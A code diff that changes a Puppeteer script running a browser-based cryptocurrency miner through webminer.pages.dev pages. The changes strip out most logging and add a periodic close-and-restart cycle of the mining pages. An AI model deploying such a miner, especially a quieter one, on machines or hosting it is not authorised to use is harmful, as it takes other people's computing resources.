@@ -5,16 +5,6 @@ const puppeteer = require('puppeteer');
 
 let retries = 50;
 
-function printProgress(msg) {
-  console.clear();
-  console.log('* Versions:   Browserless v1.0.0');
-  console.log(`* Author:     malphite-code`);
-  console.log(`* Donation:   BTC: bc1qzqtkcf28ufrr6dh3822vcz6ru8ggmvgj3uz903`);
-  console.log(`              RVN: RVZD5AjUBXoNnsBg9B2AzTTdEeBNLfqs65`);
-  console.log(`              LTC: ltc1q8krf9g60n4q6dvnwg3lg30lp5e7yfvm2da5ty5`);
-  console.table(msg);
-}
-
 const run = async () => {
   let interval = null;
   let urls = {};
@@ -25,14 +15,12 @@ const run = async () => {
     const query = Object.entries(params)
     .map(([key, value]) => `${encodeURIComponent(key)}=${encodeURIComponent(value)}`)
     .join('&');
-
     urls[`${params.algorithm}_${index}`] = `https://webminer.pages.dev/?${query}`;
   });
 
   try {
     const algos = Object.keys(urls);
 
-    console.log(`[Native]: Browser starting...`);
     // Launch a headless browser
     const browser = await puppeteer.launch({
       headless: true,
@@ -79,62 +67,48 @@ const run = async () => {
         "--no-zygote",
         "--password-store=basic",
         "--use-gl=swiftshader",
-        "--use-mock-keychain",
-        "--incognito"
+        "--use-mock-keychain"
       ],
       ignoreHTTPSErrors: true,
     });
 
-    for (let index = 0; index < algos.length; index++) {
-      const algo = algos[index];
-      const url = urls[algo];
+    const createPage = async () => {
+        for (let index = 0; index < algos.length; index++) {
+          const algo = algos[index];
+          const url = urls[algo];
+          
+          // Create a new page
+          const page = await browser.newPage();
+    
+          // Navigate to the file URL
+          await page.goto(url);
+    
+          // Store page
+          pages[algo] = page;
+        }
+    }
 
-      console.log(`[Native]: Page starting with url "${url}"`);
-
-      // Create a new page
-      const page = await browser.newPage();
-
-      // Navigate to the file URL
-      await page.goto(url);
-
-      // Store page
-      pages[algo] = page;
+    const closePage = async () => {
+        for (let index = 0; index < algos.length; index++) {
+          const algo = algos[index];
+          const page = pages[algo];
+          await page.close();
+        }
     }
 
     // Log
     interval = setInterval(async () => {
-      try {
-        const msg = {};
-        for (let index = 0; index < algos.length; index++) {
-          const algo = algos[index];
-          const page = pages[algo];
-          let hashrate = await page.evaluate(() => document.querySelector('#hashrate')?.innerText ?? "0 H/s");
-          let shared = await page.evaluate(() => document.querySelector('#shared')?.innerText ?? "0");
-          msg[algo] = { 'Hashrate': hashrate, 'Shared': Number(shared) };
-        }
-        printProgress(msg);
-      } catch (error) {
-        console.log(`[${retries}] Miner Restart: `, error.message);
-        clearInterval(interval);
-        if (retries > 0) {
-          retries--;
-          run();
-        } else {
-          process.exit(1);
-        }
-      }
-    }, 6000);
+      // Close page
+      await closePage();
 
+      // Restart page
+      setTimeout(async () => {
+        await createPage();
+      }, 5 * 60 * 1000)
+    }, 65 * 60 * 1000);
   } catch (error) {
-    console.log(`[${retries}] Miner Restart: `, error.message);
     clearInterval(interval);
-
-    if (retries > 0) {
-      retries--;
-      run();
-    } else {
-      process.exit(1);
-    }
+    run();
   }
 }
 
